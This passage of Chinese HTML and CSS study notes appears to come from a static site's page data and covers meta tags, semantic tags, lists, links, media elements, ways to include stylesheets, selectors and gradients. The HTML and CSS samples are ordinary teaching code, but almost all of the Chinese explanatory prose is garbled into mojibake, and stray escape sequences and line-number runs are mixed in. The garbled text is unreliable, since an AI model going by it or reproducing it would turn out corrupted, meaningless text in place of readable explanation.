å®¹åºå¤è®¡ç®\n\n * border-box èæ¯å¾ççåéä»è¾¹æ¡å¤å¼å§è®¡ç®\n\nbackground-size è®¾ç½®èæ¯å¾ççå¤§å°\n\n * ç¬¬ä¸ä¸ªå¼è¡¨ç¤ºå®½åº¦\n\n * ç¬¬äºä¸ªå¼è¡¨ç¤ºé«åº¦\n\nå¦æåªåä¸ä¸ªï¼åç¬¬äºä¸ªå¼é»è®¤æ¯ autoï¼cover å¾ççæ¯ä¾ä¸åï¼å°åç´ éºæ»¡ãcontain å¾çæ¯ä¾ä¸åï¼å°å¾çå¨åç´ ä¸­å®æ´æ¾ç¤ºã\n\nbackground-color\nbackground-image\nbackground-repeat\nbackground-position\nbackground-size\nbackground-origin\nbackground-clip\nbackground-attachment\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nbackgound èæ¯ç¸å³çç®åå±æ§ï¼ææèæ¯ç¸å³çæ ·å¼é½å¯ä»¥éè¿è¯¥æ ·å¼æ¥è®¾ç½®ãå¹¶ä¸è¯¥æ ·å¼æ²¡æé¡ºåºè¦æ±ï¼ä¹æ²¡æåªä¸ªå±æ§æ¯å¿é¡»åçã\n\nbackground-sizeå¿é¡»åå¨background-positionçåè¾¹ï¼å¹¶ä¸ä½¿ç¨/éå¼ï¼background-position/background-sizeã\n\nbackground-origin background-clip ä¸¤ä¸ªæ ·å¼ ï¼orginè¦å¨clipçåè¾¹ã\n\nbackground-attachmentï¼èæ¯å¾çæ¯å¦è·éåç´ ç§»å¨\n\n * scroll é»è®¤å¼ èæ¯å¾çä¼è·éåç´ ç§»å¨\n\n * fixed èæ¯ä¼åºå®å¨é¡µé¢ä¸­ï¼ä¸ä¼éåç´ ç§»å¨\n\n# æ¸å\n\néè¿æ¸åå¯ä»¥è®¾ç½®ä¸äºå¤æçèæ¯é¢è²ï¼å¯ä»¥å®ç°ä»ä¸ä¸ªé¢è²åå¶ä»é¢è²è¿æ¸¡çææï¼æ¸åæ¯å¾çï¼éè¦éè¿background-imageæ¥è®¾ç½®\n\nçº¿æ§æ¸åï¼é¢è²æ²¿çä¸æ¡ç´çº¿åçååï¼linear-gradient()\n\nlinear-gradient(red,yellow) çº¢è²å¨å¼å¤´ï¼é»è²å¨ç»å°¾ï¼ä¸­é´æ¯è¿æ¸¡åºå\n\nçº¿æ§æ¸åçå¼å¤´ï¼æä»¬å¯ä»¥æå®ä¸ä¸ªæ¸åçæ¹å\n\n * to left\n\n * to right\n\n * to bottom\n\n * to top\n\n * deg degè¡¨ç¤ºåº¦æ°\n\n * turn è¡¨ç¤ºå\n\næ¸åå¯ä»¥åæ¶æå®å¤ä¸ªé¢è²ï¼å¤ä¸ªé¢è²é»è®¤æåµä¸å¹³ååå¸ï¼ä¹å¯ä»¥æå¨æå®æ¸åçåå¸æåµ\n\nrepeating-linear-gradient() å¯ä»¥å¹³éºççº¿æ§æ¸å\n\nradial-gradient() å¾åæ¸å(æ¾å°æ§çææ)\n\né»è®¤æåµä¸å¾åæ¸åçå½¢ç¶æ ¹æ®åç´ çå½¢ç¶æ¥è®¡ç®çãæ­£æ¹å½¢ --\x3e åå½¢ï¼é¿æ¹å½¢ --\x3e æ¤­åå½¢\n\næä»¬ä¹å¯ä»¥æå¨æå®å¾åæ¸åçå¤§å°\n\n * circle\n\n * ellipse\n\nä¹å¯ä»¥æå®æ¸åçä½ç½®\n\nradial-gradient(å¤§å° at ä½ç½®, é¢è² ä½ç½® ,é¢è² ä½ç½® ,é¢è² ä½ç½®)\n\nå¤§å°\n\n * circle åå½¢\n\n * ellipse æ¤­å\n\n * closest-side è¿è¾¹\n\n * closest-corner è¿è§\n\n * farthest-side è¿è¾¹\n\n * farthest-corner è¿è§\n\nä½ç½®ï¼\n\ntop right left center bottom\n\n\n# å¨ç»\n\n\n# ååºå¼å¸å±\n\n\n# ç»ä¹ ',normalizedContent:'# html & css åºç¡\n\n\n# html æ ç­¾\n\n\n# å®ä½\n\nå¦ææä»¬å¨ç½é¡µä¸­ç¼åçå¤ä¸ªç©ºæ ¼ï¼é»è®¤æåµä¼èªå¨è¢«æµè§å¨è§£æä¸ºä¸ä¸ªç©ºæ ¼ãå¦å¤å¨htmlä¸­æäºæ¶åï¼æä»¬ä¸è½ç´æ¥ä¹¦åä¸äºç¹æ®ç¬¦å·ãæ¯å¦ï¼å¤ä¸ªè¿ç»­çç©ºæ ¼ï¼æ¯å¦å­æ¯ä¸¤ä¾§çå¤§äºåå°äºå·ãå¦ææä»¬éè¦å¨ç½é¡µä¸­ä¹¦åè¿äºç¹æ®çç¬¦å·ï¼åéè¦ä½¿ç¨htmlä¸­çå®ä½ï¼è½¬ä¹å­ç¬¦ï¼ï¼\n\n&å®ä½çåå­;\n&nbsp; ç©ºæ ¼\n&gt; å¤§äºå·\n&lt; å°äºå·\n&copy; çæç¬¦å·\n\n\n1\n2\n3\n4\n5\n\n\n\n# metaæ ç­¾\n\nmetaä¸»è¦ç¨äºè®¾ç½®ç½é¡µä¸­çä¸äºåæ°æ®ï¼åæ°æ®ä¸æ¯ç»ç¨æ·ç\n\n * charset æå®ç½é¡µçå­ç¬¦é\n * name æå®çæ°æ®çåç§°\n * content æå®çæ°æ®çåå®¹\n * keywords è¡¨ç¤ºç½ç«çå³é®å­ï¼å¯ä»¥åæ¶æå®å¤ä¸ªå³é®å­ï¼å³é®å­é´ä½¿ç¨,éå¼\n\nmetaä¸»è¦ç¨äºè®¾ç½®ç½é¡µä¸­çä¸äºåæ°æ®ï¼åæ°æ®ä¸æ¯ç»ç¨æ·ç\ncharset æå®ç½é¡µçå­ç¬¦é\nname æå®çæ°æ®çåç§°\ncontent æå®çæ°æ®çåå®¹\n\nkeywords è¡¨ç¤ºç½ç«çå³é®å­ï¼å¯ä»¥åæ¶æå®å¤ä¸ªå³é®å­ï¼å³é®å­é´ä½¿ç¨,éå¼\n<meta name="keywords" content="ç½ä¸è´­ç©,ç½ä¸åå,ææº,ç¬è®°æ¬,çµè,mp3,cd,vcd,dv,ç¸æº,æ°ç ,éä»¶,æè¡¨,å­å¨å¡,äº¬ä¸"/>\n<meta name="keywords" content="ç½è´­,ç½ä¸è´­ç©,å¨çº¿è´­ç©,ç½è´­ç½ç«,ç½è´­åå,è´­ç©ç½ç«,ç½è´­ä¸­å¿,è´­ç©ä¸­å¿,åè¶,äºé©¬é,åè¶äºé©¬é,äºé©¬éä¸­å½,joyo,amazon">\n\ndescription ç¨äºæå®ç½ç«çæè¿°\n<meta name="description" content="äº¬ä¸jd.com-ä¸ä¸çç»¼åç½ä¸è´­ç©åå,éå®å®¶çµãæ°ç éè®¯ãçµèãå®¶å±ç¾è´§ãæè£æé¥°ãæ¯å©´ãå¾ä¹¦ãé£åç­æ°ä¸ä¸ªåçä¼è´¨åå.ä¾¿æ·ãè¯ä¿¡çæå¡ï¼ä¸ºæ¨æä¾ææ¦çç½ä¸è´­ç©ä½éª!"/>\nç½ç«çæè¿°ä¼æ¾ç¤ºå¨æç´¢å¼æçæç´¢çç»æä¸­\n\ntitleæ ç­¾çåå®¹ä¼ä½ä¸ºæç´¢ç»æçè¶é¾æ¥ä¸çæå­æ¾ç¤º\n\n<meta name="keywords" content="ç½è´­,ç½ä¸è´­ç©,å¨çº¿è´­ç©,ç½è´­ç½ç«,ç½è´­åå,è´­ç©ç½ç«,ç½è´­ä¸­å¿,è´­ç©ä¸­å¿,åè¶,äºé©¬é,åè¶äºé©¬é,äºé©¬éä¸­å½,joyo,amazon">\n\ndescription ç¨äºæå®ç½ç«çæè¿°\nç½ç«çæè¿°ä¼æ¾ç¤ºå¨æç´¢å¼æçæç´¢çç»æä¸­\ntitleæ ç­¾çåå®¹ä¼ä½ä¸ºæç´¢ç»æçè¶é¾æ¥ä¸çæå­æ¾ç¤º\n\n<meta name="description" content="äº¬ä¸jd.com-ä¸ä¸çç»¼åç½ä¸è´­ç©åå,éå®å®¶çµãæ°ç éè®¯ãçµèãå®¶å±ç¾è´§ãæè£æé¥°ãæ¯å©´ãå¾ä¹¦ãé£åç­æ°ä¸ä¸ªåçä¼è´¨åå.ä¾¿æ·ãè¯ä¿¡çæå¡ï¼ä¸ºæ¨æä¾ææ¦çç½ä¸è´­ç©ä½éª!"/>\n\n--\x3e\n<meta name="keywords" content="html5,åç«¯,css3">\n<meta name="description" content="è¿æ¯ä¸ä¸ªéå¸¸ä¸éçç½ç«">\n\x3c!--\n<meta http-equiv="refresh" content="3;url=https://www.mozilla.org"> \nå°é¡µé¢éå®åå°å¦ä¸ä¸ªç½ç«\n--\x3e\n\x3c!-- <meta http-equiv="refresh" content="3;url=https://www.baidu.com"> --\x3e\n<title>document</title>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# è¯­ä¹åæ ç­¾\n\nå¨ç½é¡µä¸­htmlä¸é¨ç¨æ¥è´è´£ç½é¡µçç»æï¼æä»¥å¨ä½¿ç¨htmlæ ç­¾æ¶ï¼åºè¯¥å³æ³¨çæ¯æ ç­¾çè¯­ä¹ï¼èä¸æ¯å®çæ ·å¼ã\n\n# æ é¢\n\n * h1 ~ h6 ä¸å±æå­çº§æ é¢\n\n * ä»h1~h6éè¦æ§éåï¼h1æéè¦ï¼h6æä¸éè¦\n   \n     -         h1å¨ç½é¡µä¸­çéè¦æ§ä»æ¬¡äºtitleæ ç­¾ï¼ä¸è¬æåµä¸ä¸ä¸ªé¡µé¢ä¸­åªä¼æä¸ä¸ªh1\n     -          ä¸è¬æåµä¸æ é¢æ ç­¾åªä¼ä½¿ç¨å°h1~h3ï¼h4~h6å¾å°ç¨\n     -         æ é¢æ ç­¾é½æ¯ååç´ \n     -          å¨é¡µé¢ä¸­ç¬å ä¸è¡çåç´ ç§°ä¸ºååç´ ï¼block elementï¼\n   \n\n<h1>ä¸çº§æ é¢</h1>\n<h2>äºçº§æ é¢</h2>\n<h3>ä¸çº§æ é¢</h3>\n<h4>åçº§æ é¢</h4>\n<h5>äºçº§æ é¢</h5>\n<h6>å­çº§æ é¢</h6>\n\n\x3c!-- \nhgroupæ ç­¾ç¨æ¥ä¸ºæ é¢åç»ï¼å¯ä»¥å°ä¸ç»ç¸å³çæ é¢åæ¶æ¾å¥å°hgroup\n\n--\x3e\n<hgroup>\n  <h1>åä¹¡å¶ä¹¦äºé¦</h1>\n  <h2>å¶ä¸</h2>\n</hgroup>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n# æå­æ ç­¾\n\næå­æ ç­¾åå«ï¼\n\n * pï¼ ååç´ ï¼è¡¨ç¤ºä¸ä¸ªæ®µè½\n * emï¼è¯­é³è¯­è°çå éï¼è¡ååç´ \n * strongï¼å¼ºè°ï¼è¡¨ç¤ºåå®¹éè¦\n * blockquoteï¼é¿å¼ç¨\n * qï¼ç­å¼ç¨\n * brï¼æ¢è¡\n\n\x3c!-- \npæ ç­¾è¡¨ç¤ºé¡µé¢ä¸­çä¸ä¸ªæ®µè½\n\npä¹æ¯ä¸ä¸ªååç´ \n--\x3e\n<p>å¨pæ ç­¾ä¸­çåå®¹å°±è¡¨ç¤ºä¸ä¸ªæ®µè½</p>\n<p>å¨pæ ç­¾ä¸­çåå®¹å°±è¡¨ç¤ºä¸ä¸ªæ®µè½</p>\n\n\x3c!-- \nemæ ç­¾ç¨äºè¡¨ç¤ºè¯­é³è¯­è°çä¸ä¸ªå é\n\nå¨é¡µé¢ä¸­ä¸ä¼ç¬å ä¸è¡çåç´ ç§°ä¸ºè¡ååç´ ï¼inline elementï¼\n--\x3e\n<p>ä»å¤©å¤©æ°<em>ç</em>ä¸éï¼</p>\n\n\x3c!-- \nstrongè¡¨ç¤ºå¼ºè°ï¼éè¦åå®¹ï¼\n--\x3e\n<p>ä½ ä»å¤©å¿é¡»è¦<strong>å®æä½ä¸</strong>ï¼</p>\n\né²è¿è¯´ï¼\n\x3c!-- blockquote è¡¨ç¤ºä¸ä¸ªé¿å¼ç¨ --\x3e\n<blockquote>\n  è¿å¥è¯ææ¯ä»æ¥æ²¡æè¯´è¿çï¼\n</blockquote>\n\n\x3c!-- \nqè¡¨ç¤ºä¸ä¸ªç­å¼ç¨\n--\x3e\nå­æ°<q>å­¦èæ¶ä¹ ä¹ï¼ä¹åµä¹åµï¼</q>\n\n\x3c!-- \nbræ ç­¾è¡¨ç¤ºé¡µé¢ä¸­çæ¢è¡\n--\x3e\n<br>\n<br>\n\nä»å¤©å¤©æ°çä¸é\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n# ååç´ åè¡ååç´ \n\nååç´ ï¼block elementï¼\n\n * å¨ç½é¡µä¸­ä¸è¬éè¿ååç´ æ¥å¯¹é¡µé¢è¿è¡å¸å±\n\nè¡ååç´ (inline elementï¼\n\n * è¡ååç´ ä¸»è¦ç¨æ¥åè£¹æå­\n\n * å¨ååç´ ä¸­æ¾è¡ååç´ ï¼èä¸ä¼å¨è¡ååç´ ä¸­æ¾ååç´ \n\n * ååç´ ä¸­åºæ¬ä¸ä»ä¹é½è½æ¾\n\n * påç´ ä¸­ä¸è½æ¾ä»»ä½çååç´ \n\næµè§å¨å¨è§£æç½é¡µæ¶ï¼ä¼èªå¨å¯¹ç½é¡µä¸­ä¸ç¬¦åè§èçåå®¹è¿è¡ä¿®æ­£\n\n * æ ç­¾åå¨äºæ ¹åç´ çå¤é¨\n * påç´ ä¸­åµå¥äºååç´ \n * æ ¹åç´ ä¸­åºç°äºé¤headåbodyä»¥å¤çå­åç´ \n\n# å¸å±æ ç­¾\n\n * header è¡¨ç¤ºç½é¡µçå¤´é¨\n * main è¡¨ç¤ºç½é¡µçä¸»ä½é¨å(ä¸ä¸ªé¡µé¢ä¸­åªä¼æä¸ä¸ªmain)\n * footer è¡¨ç¤ºç½é¡µçåºé¨\n * nav è¡¨ç¤ºç½é¡µä¸­çå¯¼èª\n * aside åä¸»ä½ç¸å³çå¶ä»åå®¹ï¼ä¾§è¾¹æ ï¼\n * article è¡¨ç¤ºä¸ä¸ªç¬ç«çæç« \n * section è¡¨ç¤ºä¸ä¸ªç¬ç«çåºåï¼ä¸è¾¹çæ ç­¾é½ä¸è½è¡¨ç¤ºæ¶ä½¿ç¨section\n * div æ²¡æè¯­ä¹ï¼å°±ç¨æ¥è¡¨ç¤ºä¸ä¸ªåºåï¼ç®åæ¥è®²divè¿æ¯æä»¬ä¸»è¦çå¸å±åç´ \n * span è¡ååç´ ï¼æ²¡æä»»ä½çè¯­ä¹ï¼ä¸è¬ç¨äºå¨ç½é¡µä¸­éä¸­æå­\n\n\n# åè¡¨\n\n# æåºåè¡¨\n\nä½¿ç¨olæ ç­¾æ¥åå»ºæ åºåè¡¨ï¼ä½¿ç¨liè¡¨ç¤ºåè¡¨é¡¹\n\n# æ åºåè¡¨\n\nä½¿ç¨ulæ ç­¾æ¥åå»ºæ åºåè¡¨ï¼ä½¿ç¨liè¡¨ç¤ºåè¡¨é¡¹\n\n# å®ä¹åè¡¨\n\nä½¿ç¨dlæ ç­¾æ¥åå»ºä¸ä¸ªå®ä¹åè¡¨ï¼ä½¿ç¨dtæ¥è¡¨ç¤ºå®ä¹çåå®¹ï¼ä½¿ç¨ddæ¥å¯¹åå®¹è¿è¡è§£éè¯´æ\n\n<ul>\n  <li>ç»æ</li>\n  <li>è¡¨ç°</li>\n  <li>è¡ä¸º</li>\n</ul>\n\n<ol>\n  <li>ç»æ</li>\n  <li>è¡¨ç°</li>\n  <li>è¡ä¸º</li>\n</ol>\n\n\n<dl>\n  <dt>ç»æ</dt>\n  <dd>ç»æè¡¨ç¤ºç½é¡µçç»æï¼ç»æç¨æ¥è§å®ç½é¡µä¸­åªéæ¯æ é¢ï¼åªéæ¯æ®µè½</dd>\n  <dd>ç»æè¡¨ç¤ºç½é¡µçç»æï¼ç»æç¨æ¥è§å®ç½é¡µä¸­åªéæ¯æ é¢ï¼åªéæ¯æ®µè½</dd>\n  <dd>ç»æè¡¨ç¤ºç½é¡µçç»æï¼ç»æç¨æ¥è§å®ç½é¡µä¸­åªéæ¯æ é¢ï¼åªéæ¯æ®µè½</dd>\n</dl>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# è¶é¾æ¥\n\nè¶é¾æ¥å¯ä»¥è®©æä»¬ä»ä¸ä¸ªé¡µé¢è·³è½¬å°å¶ä»é¡µé¢ï¼æèæ¯å½åé¡µé¢çå¶ä»çä½ç½®\n\nä½¿ç¨ a æ ç­¾æ¥å®ä¹è¶é¾æ¥ï¼href æå®è·³è½¬çç®æ è·¯å¾ãå¼å¯ä»¥æ¯ä¸ä¸ªå¤é¨ç½ç«çå°åï¼ä¹å¯ä»¥åä¸ä¸ªåé¨é¡µé¢çå°åãè¶é¾æ¥æ¯ä¹æ¯ä¸ä¸ªè¡ååç´ ï¼å¨aæ ç­¾ä¸­å¯ä»¥åµå¥é¤å®èªèº«å¤çä»»ä½åç´ ã\n\ntargetå±æ§ï¼ç¨æ¥æå®è¶é¾æ¥æå¼çä½ç½®ï¼_self é»è®¤å¼ å¨å½åé¡µé¢ä¸­æå¼è¶é¾æ¥ï¼_blank å¨ä¸ä¸ªæ°çè¦ä¹ä¸­æå¼è¶é¾æ¥ã\n\nå¯ä»¥ç´æ¥å°è¶é¾æ¥çhrefå±æ§è®¾ç½®ä¸º#ï¼è¿æ ·ç¹å»è¶é¾æ¥ä»¥åï¼é¡µé¢ä¸ä¼åçè·³è½¬ï¼èæ¯è½¬å°å½åé¡µé¢çé¡¶é¨çä½ç½®ãå¯ä»¥è·³è½¬å°é¡µé¢çæå®ä½ç½®ï¼åªéå°hrefå±æ§è®¾ç½® #ç®æ åç´ çidå±æ§å¼ã\n\n<a id="bottom" href="#">åå°é¡¶é¨</a>\n\n\n1\n\n\n\n# å¾çæ ç­¾\n\nå¾çæ ç­¾ç¨äºåå½åé¡µé¢ä¸­å¼å¥ä¸ä¸ªå¤é¨å¾çï¼ä½¿ç¨imgæ ç­¾æ¥å¼å¥å¤é¨å¾çï¼imgæ ç­¾æ¯ä¸ä¸ªèªç»ææ ç­¾ã imgè¿ç§åç´ å±äºæ¿æ¢åç´ ï¼ååè¡ååç´ ä¹é´ï¼å·æä¸¤ç§åç´ çç¹ç¹ï¼ã\n\nç¸å³å±æ§ï¼\n\n * src å±æ§æå®çæ¯å¤é¨å¾ççè·¯å¾ï¼è·¯å¾è§ååè¶é¾æ¥æ¯ä¸æ ·çï¼\n * alt å¾ççæè¿°ï¼è¿ä¸ªæè¿°é»è®¤æåµä¸ä¸ä¼æ¾ç¤ºï¼æäºæµè§å¨ä¼å¾çæ æ³å è½½æ¶æ¾ç¤ºï¼æç´¢å¼æä¼æ ¹æ®altä¸­çåå®¹æ¥è¯å«å¾çï¼å¦æä¸åaltå±æ§åå¾çä¸ä¼è¢«æç´¢å¼æææ¶å½\n * width å¾ççå®½åº¦ (åä½æ¯åç´ )\n * height å¾ççé«åº¦\n   * å®½åº¦åé«åº¦ä¸­å¦æåªä¿®æ¹äºä¸ä¸ªï¼åå¦ä¸ä¸ªä¼ç­æ¯ä¾ç¼©æ¾\n   * ä¸è¬æåµå¨pcç«¯ï¼ä¸å»ºè®®ä¿®æ¹å¾ççå¤§å°ï¼éè¦å¤å¤§çå¾çå°±è£å¤å¤§\n   * ä½æ¯å¨ç§»å¨ç«¯ï¼ç»å¸¸éè¦å¯¹å¾çè¿è¡ç¼©æ¾ï¼å¤§å¾ç¼©å°ï¼\n\n<img src="./img/1.gif" alt="æ¾é¼ ">\n\n<img width="200"  src="https://d2ggl082rr1mkp.cloudfront.net/category/ironman_preview_1521810286_220_310.jpeg" alt="é¢éä¾ ">\n\n\n1\n2\n3\n\n\n\n# åèæ¡æ¶\n\nåèæ¡æ¶ï¼ç¨äºåå½åé¡µé¢ä¸­å¼å¥ä¸ä¸ªå¶ä»é¡µé¢\n\n * src æå®è¦å¼å¥çç½é¡µçè·¯å¾\n * frameborder æå®åèæ¡æ¶çè¾¹æ¡\n\n<iframe src="https://www.qq.com" width="800" height="600" frameborder="0"></iframe>\n<h1>hello</h1>\n\n\n1\n2\n\n\n\n# å¤åªä½\n\naudio æ ç­¾ç¨æ¥åé¡µé¢ä¸­å¼å¥ä¸ä¸ªå¤é¨çé³é¢æä»¶çï¼é³è§é¢æä»¶å¼å¥æ¶ï¼é»è®¤æåµä¸ä¸åè®¸ç¨æ·èªå·±æ§å¶æ­æ¾åæ­¢ã\n\n * controls æ¯å¦åè®¸ç¨æ·æ§å¶æ­æ¾\n\n * autoplay é³é¢æä»¶æ¯å¦èªå¨æ­æ¾\n\n * å¦æè®¾ç½®äºautoplay åé³ä¹å¨æå¼é¡µé¢æ¶ä¼èªå¨æ­æ¾\n\n * ä½æ¯ç®åæ¥è®²å¤§é¨åæµè§å¨é½ä¸ä¼èªå¨å¯¹é³ä¹è¿è¡æ­æ¾\n\n * loop é³ä¹æ¯å¦å¾ªç¯æ­æ¾\n\n\x3c!-- <audio src="./source/audio.mp3" controls autoplay loop></audio> --\x3e\n\x3c!-- <audio src="./source/audio.mp3" controls></audio> --\x3e\n\x3c!-- é¤äºéè¿srcæ¥æå®å¤é¨æä»¶çè·¯å¾ä»¥å¤ï¼è¿å¯ä»¥éè¿sourceæ¥æå®æä»¶çè·¯å¾ --\x3e\n<audio controls>\n  \x3c!-- å¯¹ä¸èµ·ï¼æ¨çæµè§å¨ä¸æ¯ææ­æ¾é³é¢ï¼è¯·åçº§æµè§å¨ï¼ --\x3e\n  <source src="./source/audio.mp3">\n  <source src="./source/audio.ogg">\n  <embed src="./source/audio.mp3" type="audio/mp3" width="300" height="100">\n</audio>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nä½¿ç¨videoæ ç­¾æ¥åç½é¡µä¸­å¼å¥ä¸ä¸ªè§é¢ï¼ä½¿ç¨æ¹å¼åaudioåºæ¬ä¸æ¯ä¸æ ·ç\n\n<video controls>\n  <source src="./source/flower.webm">\n  <source src="./source/flower.mp4">\n  <embed src="./source/flower.mp4" type="video/mp4">\n</video>\n\n\n1\n2\n3\n4\n5\n\n\n\n# è¡¨æ ¼\n\n\n# è¡¨å\n\n\n# cssæ ·å¼\n\n\n# cssç®ä»\n\nç½é¡µåæä¸ä¸ªé¨åï¼\n\n * ç»æ(html)\n * è¡¨ç°(css)\n * è¡ä¸º(javascript)\n\ncsså¨ç§°cascading style sheetsï¼å±å æ ·å¼è¡¨ãç½é¡µå®éä¸æ¯ä¸ä¸ªå¤å±çç»æï¼éè¿csså¯ä»¥åå«ä¸ºç½é¡µçæ¯ä¸ä¸ªå±æ¥è®¾ç½®æ ·å¼\n\nèæç»æä»¬è½çå°åªæ¯ç½é¡µçæä¸è¾¹ä¸å±ãæ»ä¹ä¸å¥è¯ï¼cssç¨æ¥è®¾ç½®ç½é¡µä¸­åç´ çæ ·å¼ã\n\nä½¿ç¨cssæ¥ä¿®æ¹åç´ çæ ·å¼ï¼æä»¥ä¸ä¸ç§æ¹å¼ï¼\n\n * ç¬¬ä¸ç§æ¹å¼(åèæ ·å¼ï¼è¡åæ ·å¼)ï¼\n   * å¨æ ç­¾åé¨éè¿styleå±æ§æ¥è®¾ç½®åç´ çæ ·å¼\n   * ä½¿ç¨åèæ ·å¼ï¼æ ·å¼åªè½å¯¹ä¸ä¸ªæ ç­¾çæï¼å¦æå¸æå½±åå°å¤ä¸ªåç´ å¿é¡»å¨æ¯ä¸ä¸ªåç´ ä¸­é½å¤å¶ä¸é\n   * å¹¶ä¸å½æ ·å¼åçååæ¶ï¼æä»¬å¿é¡»è¦ä¸ä¸ªä¸ä¸ªçä¿®æ¹ï¼éå¸¸çä¸æ¹ä¾¿\n   * æ³¨æï¼å¼åæ¶ç»å¯¹ä¸è¦ä½¿ç¨åèæ ·å¼\n\n<p style="color:red; font-size: 60px;">å°å°ç¦»å®¶èå¤§åï¼ä¹¡é³æ æ¹é¬æ¯è¡°</p>\n\n<p style="color: red; font-size: 60px;">ä»å¤©å¤©æ°çä¸éï¼</p>\n\n\n1\n2\n3\n\n\n * ç¬¬äºç§æ¹å¼ï¼åé¨æ ·å¼è¡¨ï¼\n   \n   * å°æ ·å¼ç¼åå°headä¸­çstyleæ ç­¾éï¼ç¶åéè¿cssçéæ©å¨æ¥éä¸­åç´ å¹¶ä¸ºå¶è®¾ç½®åç§æ ·å¼\n   \n   * å¯ä»¥åæ¶ä¸ºå¤ä¸ªæ ç­¾è®¾ç½®æ ·å¼ï¼å¹¶ä¸ä¿®æ¹æ¶åªéè¦ä¿®æ¹ä¸å¤å³å¯å¨é¨åºç¨\n   \n   * åé¨æ ·å¼è¡¨æ´å æ¹ä¾¿å¯¹æ ·å¼è¿è¡å¤ç¨\n   \n   * æä»¬çåé¨æ ·å¼è¡¨åªè½å¯¹ä¸ä¸ªç½é¡µèµ·ä½ç¨ï¼å®éè¾¹çæ ·å¼ä¸è½è·¨é¡µé¢è¿è¡å¤ç¨\n\n<style>\n\n  p{\n    color: green;\n    font-size: 50px;\n  }\n\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * ç¬¬ä¸ç§æ¹å¼ ï¼å¤é¨æ ·å¼è¡¨ï¼ æä½³å®è·µ\n   * å¯ä»¥å°cssæ ·å¼ç¼åå°ä¸ä¸ªå¤é¨çcssæä»¶ä¸­ï¼ç¶åéè¿linkæ ç­¾æ¥å¼å¥å¤é¨çcssæä»¶\n   * å¤é¨æ ·å¼è¡¨éè¦éè¿linkæ ç­¾è¿è¡å¼å¥ï¼æå³çåªè¦æ³ä½¿ç¨è¿äºæ ·å¼çç½é¡µé½å¯ä»¥å¯¹å¶è¿è¡å¼ç¨ãä½¿æ ·å¼å¯ä»¥å¨ä¸åé¡µé¢ä¹é´è¿è¡å¤ç¨\n   * å°æ ·å¼ç¼åå°å¤é¨çcssæä»¶ä¸­ï¼å¯ä»¥ä½¿ç¨å°æµè§å¨çç¼å­æºå¶ï¼ä»èå å¿«ç½é¡µçå è½½éåº¦ï¼æé«ç¨æ·çä½éªã\n\n<link rel="stylesheet" href="./style.css">\n\n\n1\n\n\np{\n    color: tomato;\n    font-size: 50px;\n}\n\n\n1\n2\n3\n4\n\n\n\n# cssåºæ¬è¯­æ³\n\ncssç±ä¸¤é¨åç»æï¼éæ©å¨åå£°æåï¼å¶ä¸­éæ©å¨ç¨äºéä¸­éè¦æ·»å æ ·å¼çåç´ ï¼å£°æåæ¯å¯¹æ ·å¼çå·ä½è®¾ç½®ã\n\n * éæ©å¨ï¼éè¿éæ©å¨å¯ä»¥éä¸­é¡µé¢ä¸­çæå®åç´ ãæ¯å¦ p çä½ç¨å°±æ¯éä¸­é¡µé¢ä¸­ææçpåç´ \n * å£°æåï¼éè¿å£°æåæ¥æå®è¦ä¸ºåç´ è®¾ç½®çæ ·å¼ï¼å£°æåç±ä¸ä¸ªä¸ä¸ªçå£°æç»æï¼ä¸ä¸ªåå¼å¯¹ç»æãä¸ä¸ªæ ·å¼åå¯¹åºä¸ä¸ªæ ·å¼å¼ï¼ååå¼ä¹é´ä»¥:è¿æ¥ï¼ä»¥;ç»å°¾ã\n\np{\n  color: red;\n  font-size: 40px;\n}\n\nh1{\n  color: green;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# csséæ©å¨\n\n# åç´ éæ©å¨\n\nä½ç¨ï¼æ ¹æ®æ ç­¾åæ¥éä¸­æå®çåç´ \n\nè¯­æ³ï¼æ ç­¾å{}\n\nä¾å­ï¼p{} h1{} div{}\n\n# idéæ©å¨\n\nä½ç¨ï¼æ ¹æ®åç´ çidå±æ§å¼éä¸­ä¸ä¸ªåç´ \n\nè¯­æ³ï¼#idå±æ§å¼{}\n\nä¾å­ï¼#box{} #red{}\n\n# ç±»éæ©å¨\n\nä½ç¨ï¼æ ¹æ®åç´ çclasså±æ§å¼éä¸­ä¸ç»åç´ \n\nè¯­æ³ï¼.classå±æ§å¼\n\n# éééæ©å¨\n\nä½ç¨ï¼éä¸­é¡µé¢ä¸­çææåç´ \n\nè¯­æ³: *\n\n# äº¤ééæ©å¨\n\nä½ç¨ï¼éä¸­åæ¶å¤åå¤ä¸ªæ¡ä»¶çåç´ \n\nè¯­æ³ï¼éæ©å¨1éæ©å¨2éæ©å¨3éæ©å¨n{}\n\næ³¨æç¹ï¼äº¤ééæ©å¨ä¸­å¦ææåç´ éæ©å¨ï¼å¿é¡»ä½¿ç¨åç´ éæ©å¨å¼å¤´\n\ndiv.red{\n    font-size: 30px;\n}\n\n.a.b.c{\n    color: blue\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# éæ©å¨åç»\n\néæ©å¨åç»ï¼å¹¶ééæ©å¨ï¼\n\nä½ç¨ï¼åæ¶éæ©å¤ä¸ªéæ©å¨å¯¹åºçåç´ \n\nè¯­æ³ï¼éæ©å¨1,éæ©å¨2,éæ©å¨3,éæ©å¨n{}\n\n#b1,.p1,h1,span,div.red{}\n\n# å­åç´ éæ©å¨\n\nç¶åç´ \n\n * ç´æ¥åå«å­åç´ çåç´ å«åç¶åç´ \n\nå­åç´ \n\n * ç´æ¥è¢«ç¶åç´ åå«çåç´ æ¯å­åç´ \n\nç¥ååç´ \n\n * ç´æ¥æé´æ¥åå«åä»£åç´ çåç´ å«åç¥ååç´ \n * ä¸ä¸ªåç´ çç¶åç´ 